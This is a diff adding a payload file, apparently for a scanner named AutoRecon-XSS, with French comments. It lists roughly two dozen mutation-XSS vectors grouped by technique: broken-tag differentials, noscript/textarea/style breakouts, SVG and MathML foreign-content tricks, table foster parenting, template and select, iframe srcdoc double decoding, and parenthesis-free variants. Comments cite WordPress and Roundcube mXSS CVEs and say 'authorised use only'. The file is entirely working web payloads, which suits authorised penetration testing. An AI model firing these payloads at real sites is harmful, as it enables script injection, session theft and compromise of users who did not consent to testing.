@@ -1,0 +1,41 @@
+# AutoRecon-XSS — mutation XSS, EXÉCUTION confirmée (--dom-payloads).
+# TOKEN -> window.__arxcb('<marqueur>') ; TOKENBT -> sans parenthèses.
+# Le navigateur Playwright PARSE et MUTE réellement ces vecteurs : si ça exécute,
+# c'est une vraie mXSS (survit au filtre + mute en exécutable). La détection
+# multi-frames couvre l'exécution dans un <iframe srcdoc>.
+# Cf. CVE-2026-64638 / 93485 (WordPress mXSS), CVE-2026-48849 (Roundcube).
+# Usage autorisé uniquement.
+
+# --- différentiel strip_tags / balises mal fermées ---
+<scr<script>TOKEN</scr</script>ipt>
+<img src=x onerror=TOKEN //
+<p<svg/onload=TOKEN>
+
+# --- rcdata / rawtext breakout ---
+<noscript><p title="</noscript><img src=x onerror=TOKEN>">
+<textarea></textarea><img src=x onerror=TOKEN>
+<title></title><img src=x onerror=TOKEN>
+<xmp></xmp><img src=x onerror=TOKEN>
+<style></style><img src=x onerror=TOKEN>
+
+# --- foreign content (SVG / MathML) : mXSS moderne ---
+<svg><style><img src=x onerror=TOKEN></style></svg>
+<svg></p><style><a id="</style><img src=x onerror=TOKEN>">
+<math><mtext><table><mglyph><style><img src=x onerror=TOKEN></style>
+<form><math><mtext></form><form><mglyph><style></math><img src onerror=TOKEN>
+
+# --- foster parenting (table) ---
+<table><caption><svg></table><img src=x onerror=TOKEN>
+<table><math><mtext><img src=x onerror=TOKEN>
+
+# --- template / select ---
+<template><img src=x onerror=TOKEN></template>
+<select><template><img src=x onerror=TOKEN>
+
+# --- iframe srcdoc (double décodage ; détecté grâce au multi-frames) ---
+<iframe srcdoc="&lt;img src=x onerror=TOKEN&gt;">
+<iframe srcdoc="&lt;svg onload=TOKEN&gt;">
+
+# --- sans parenthèses ---
+<svg><style><img src=x onerror=TOKENBT></style></svg>
+<noscript><p title="</noscript><img src=x onerror=TOKENBT>">
